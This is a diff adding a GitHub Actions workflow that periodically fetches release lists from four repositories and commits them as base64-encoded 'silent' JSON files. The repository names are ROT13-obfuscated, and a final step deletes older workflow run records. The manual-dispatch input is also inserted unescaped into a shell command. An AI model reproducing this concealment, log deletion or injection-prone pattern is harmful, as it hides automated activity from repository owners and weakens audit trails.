@@ -1,0 +1,326 @@
+name: Update
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_repo:
+        required: false
+        default: ''
+        type: string
+  push:
+    branches: [ main, dev, master, beta ]
+  schedule:
+    - cron: '0 */12 * * *'
+
+jobs:
+  update:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      actions: write
+    steps:
+      - uses: actions/checkout@v4
+      
+      - env:
+          GITHUB_TOKEN: ${{ secrets.SECRET_KEY }}
+        run: |
+          ENCODED_REPO="flagnk-kvqm/KVQMf-JEG"
+          TARGET_REPO=$(echo "$ENCODED_REPO" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
+          HTTP_CODE=$(curl -w "%{http_code}" -s -o temp_silent.json -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -H "User-Agent: GitHub-Actions" https://api.github.com/repos/${TARGET_REPO}/releases)
+          SHOULD_UPDATE=false
+          if [ -f "silent.json" ]; then 
+            base64 -d silent.json > current.json 2>/dev/null || echo '[]' > current.json
+          else
+            echo '[]' > current.json
+          fi
+          if [ "$HTTP_CODE" = "200" ]; then
+            if [ -s temp_silent.json ] && jq empty temp_silent.json >/dev/null 2>&1; then
+              if [ -f "current.json" ]; then
+                if ! cmp -s temp_silent.json current.json; then
+                  mv temp_silent.json new.json
+                  SHOULD_UPDATE=true
+                else
+                  rm temp_silent.json
+                  mv current.json new.json
+                fi
+              else
+                mv temp_silent.json new.json
+                SHOULD_UPDATE=true
+              fi
+            else
+              rm -f temp_silent.json
+              if [ ! -f "current.json" ] || [ "$(jq -r 'type' current.json 2>/dev/null)" != "array" ]; then
+                echo '[]' > new.json
+                SHOULD_UPDATE=true
+              else
+                mv current.json new.json
+              fi
+            fi
+          elif [ "$HTTP_CODE" = "404" ]; then
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ] || [ "$(jq 'length' current.json 2>/dev/null || echo "-1")" != "0" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE=true
+            else
+              mv current.json new.json
+            fi
+          else
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE=true
+            else
+              mv current.json new.json
+            fi
+          fi
+          base64 -w 0 new.json > silent.json
+          rm -f new.json current.json temp_silent.json
+          echo "SHOULD_UPDATE=$SHOULD_UPDATE" >> $GITHUB_ENV
+      
+      - env:
+          GITHUB_TOKEN: ${{ secrets.SECRET_KEY }}
+        run: |
+          ENCODED_REPO="rvenkre/KVQMf-JEGf"
+          TARGET_REPO=$(echo "$ENCODED_REPO" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
+          HTTP_CODE=$(curl -w "%{http_code}" -s -o temp_silent.json -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -H "User-Agent: GitHub-Actions" https://api.github.com/repos/${TARGET_REPO}/releases)
+          SHOULD_UPDATE_SILENT1=false
+          if [ -f "silent1.json" ]; then 
+            base64 -d silent1.json > current.json 2>/dev/null || echo '[]' > current.json
+          else
+            echo '[]' > current.json
+          fi
+          if [ "$HTTP_CODE" = "200" ]; then
+            if [ -s temp_silent.json ] && jq empty temp_silent.json >/dev/null 2>&1; then
+              if [ -f "current.json" ]; then
+                if ! cmp -s temp_silent.json current.json; then
+                  mv temp_silent.json new.json
+                  SHOULD_UPDATE_SILENT1=true
+                else
+                  rm temp_silent.json
+                  mv current.json new.json
+                fi
+              else
+                mv temp_silent.json new.json
+                SHOULD_UPDATE_SILENT1=true
+              fi
+            else
+              rm -f temp_silent.json
+              if [ ! -f "current.json" ] || [ "$(jq -r 'type' current.json 2>/dev/null)" != "array" ]; then
+                echo '[]' > new.json
+                SHOULD_UPDATE_SILENT1=true
+              else
+                mv current.json new.json
+              fi
+            fi
+          elif [ "$HTTP_CODE" = "404" ]; then
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ] || [ "$(jq 'length' current.json 2>/dev/null || echo "-1")" != "0" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT1=true
+            else
+              mv current.json new.json
+            fi
+          else
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT1=true
+            else
+              mv current.json new.json
+            fi
+          fi
+          base64 -w 0 new.json > silent1.json
+          rm -f new.json current.json temp_silent.json
+          echo "SHOULD_UPDATE_SILENT1=$SHOULD_UPDATE_SILENT1" >> $GITHUB_ENV
+      
+      - env:
+          GITHUB_TOKEN: ${{ secrets.SECRET_KEY }}
+        run: |
+          ENCODED_REPO="arb-dhrak/KVQMf-JEG"
+          TARGET_REPO=$(echo "$ENCODED_REPO" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
+          HTTP_CODE=$(curl -w "%{http_code}" -s -o temp_silent.json -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -H "User-Agent: GitHub-Actions" https://api.github.com/repos/${TARGET_REPO}/releases)
+          SHOULD_UPDATE_SILENT2=false
+          if [ -f "silent2.json" ]; then 
+            base64 -d silent2.json > current.json 2>/dev/null || echo '[]' > current.json
+          else
+            echo '[]' > current.json
+          fi
+          if [ "$HTTP_CODE" = "200" ]; then
+            if [ -s temp_silent.json ] && jq empty temp_silent.json >/dev/null 2>&1; then
+              if [ -f "current.json" ]; then
+                if ! cmp -s temp_silent.json current.json; then
+                  mv temp_silent.json new.json
+                  SHOULD_UPDATE_SILENT2=true
+                else
+                  rm temp_silent.json
+                  mv current.json new.json
+                fi
+              else
+                mv temp_silent.json new.json
+                SHOULD_UPDATE_SILENT2=true
+              fi
+            else
+              rm -f temp_silent.json
+              if [ ! -f "current.json" ] || [ "$(jq -r 'type' current.json 2>/dev/null)" != "array" ]; then
+                echo '[]' > new.json
+                SHOULD_UPDATE_SILENT2=true
+              else
+                mv current.json new.json
+              fi
+            fi
+          elif [ "$HTTP_CODE" = "404" ]; then
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ] || [ "$(jq 'length' current.json 2>/dev/null || echo "-1")" != "0" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT2=true
+            else
+              mv current.json new.json
+            fi
+          else
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT2=true
+            else
+              mv current.json new.json
+            fi
+          fi
+          base64 -w 0 new.json > silent2.json
+          rm -f new.json current.json temp_silent.json
+          echo "SHOULD_UPDATE_SILENT2=$SHOULD_UPDATE_SILENT2" >> $GITHUB_ENV
+      
+      - env:
+          GITHUB_TOKEN: ${{ secrets.SECRET_KEY }}
+        run: |
+          ENCODED_REPO="lnug-k/KVQMf-JEG"
+          TARGET_REPO=$(echo "$ENCODED_REPO" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
+          HTTP_CODE=$(curl -w "%{http_code}" -s -o temp_silent.json -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -H "User-Agent: GitHub-Actions" https://api.github.com/repos/${TARGET_REPO}/releases)
+          SHOULD_UPDATE_SILENT3=false
+          if [ -f "silent3.json" ]; then 
+            base64 -d silent3.json > current.json 2>/dev/null || echo '[]' > current.json
+          else
+            echo '[]' > current.json
+          fi
+          if [ "$HTTP_CODE" = "200" ]; then
+            if [ -s temp_silent.json ] && jq empty temp_silent.json >/dev/null 2>&1; then
+              if [ -f "current.json" ]; then
+                if ! cmp -s temp_silent.json current.json; then
+                  mv temp_silent.json new.json
+                  SHOULD_UPDATE_SILENT3=true
+                else
+                  rm temp_silent.json
+                  mv current.json new.json
+                fi
+              else
+                mv temp_silent.json new.json
+                SHOULD_UPDATE_SILENT3=true
+              fi
+            else
+              rm -f temp_silent.json
+              if [ ! -f "current.json" ] || [ "$(jq -r 'type' current.json 2>/dev/null)" != "array" ]; then
+                echo '[]' > new.json
+                SHOULD_UPDATE_SILENT3=true
+              else
+                mv current.json new.json
+              fi
+            fi
+          elif [ "$HTTP_CODE" = "404" ]; then
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ] || [ "$(jq 'length' current.json 2>/dev/null || echo "-1")" != "0" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT3=true
+            else
+              mv current.json new.json
+            fi
+          else
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT3=true
+            else
+              mv current.json new.json
+            fi
+          fi
+          base64 -w 0 new.json > silent3.json
+          rm -f new.json current.json temp_silent.json
+          echo "SHOULD_UPDATE_SILENT3=$SHOULD_UPDATE_SILENT3" >> $GITHUB_ENV
+
+      - if: github.event.inputs.target_repo != ''
+        env:
+          GITHUB_TOKEN: ${{ secrets.SECRET_KEY }}
+        run: |
+          TARGET_REPO="${{ github.event.inputs.target_repo }}"
+          HTTP_CODE=$(curl -w "%{http_code}" -s -o temp_silent.json -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -H "User-Agent: GitHub-Actions" https://api.github.com/repos/${TARGET_REPO}/releases)
+          SHOULD_UPDATE_SILENT4=false
+          if [ -f "silent4.json" ]; then 
+            base64 -d silent4.json > current.json 2>/dev/null || echo '[]' > current.json
+          else
+            echo '[]' > current.json
+          fi
+          if [ "$HTTP_CODE" = "200" ]; then
+            if [ -s temp_silent.json ] && jq empty temp_silent.json >/dev/null 2>&1; then
+              if [ -f "current.json" ]; then
+                if ! cmp -s temp_silent.json current.json; then
+                  mv temp_silent.json new.json
+                  SHOULD_UPDATE_SILENT4=true
+                else
+                  rm temp_silent.json
+                  mv current.json new.json
+                fi
+              else
+                mv temp_silent.json new.json
+                SHOULD_UPDATE_SILENT4=true
+              fi
+            else
+              rm -f temp_silent.json
+              if [ ! -f "current.json" ] || [ "$(jq -r 'type' current.json 2>/dev/null)" != "array" ]; then
+                echo '[]' > new.json
+                SHOULD_UPDATE_SILENT4=true
+              else
+                mv current.json new.json
+              fi
+            fi
+          elif [ "$HTTP_CODE" = "404" ]; then
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ] || [ "$(jq 'length' current.json 2>/dev/null || echo "-1")" != "0" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT4=true
+            else
+              mv current.json new.json
+            fi
+          else
+            rm -f temp_silent.json
+            if [ ! -f "current.json" ]; then
+              echo '[]' > new.json
+              SHOULD_UPDATE_SILENT4=true
+            else
+              mv current.json new.json
+            fi
+          fi
+          base64 -w 0 new.json > silent4.json
+          rm -f new.json current.json temp_silent.json
+          echo "SHOULD_UPDATE_SILENT4=$SHOULD_UPDATE_SILENT4" >> $GITHUB_ENV
+        
+      - run: |
+          git config --local user.email "action@github.com"
+          git config --local user.name "GitHub Action"
+          COMMIT_NEEDED=false
+          [ "$SHOULD_UPDATE" = "true" ] && git add silent.json && COMMIT_NEEDED=true
+          [ "$SHOULD_UPDATE_SILENT1" = "true" ] && git add silent1.json && COMMIT_NEEDED=true
+          [ "$SHOULD_UPDATE_SILENT2" = "true" ] && git add silent2.json && COMMIT_NEEDED=true
+          [ "$SHOULD_UPDATE_SILENT3" = "true" ] && git add silent3.json && COMMIT_NEEDED=true
+          [ "$SHOULD_UPDATE_SILENT4" = "true" ] && git add silent4.json && COMMIT_NEEDED=true
+          if [ "$COMMIT_NEEDED" = "true" ]; then
+            if ! git diff --staged --quiet; then
+              git commit -m "Update data firmware - $(date -u '+%Y-%m-%d %H:%M UTC')"
+              git push
+            fi
+          fi
+
+      - if: always()
+        env:
+          GITHUB_TOKEN: ${{ secrets.SECRET_KEY }}
+        run: |
+          curl -s -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/${{ github.repository }}/actions/runs?per_page=50&status=completed" | jq -r '.workflow_runs[2:] | .[].id' | head -10 | while read run_id; do
+            [ ! -z "$run_id" ] && curl -s -X DELETE -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/${{ github.repository }}/actions/runs/$run_id" >/dev/null 2>&1
+          done
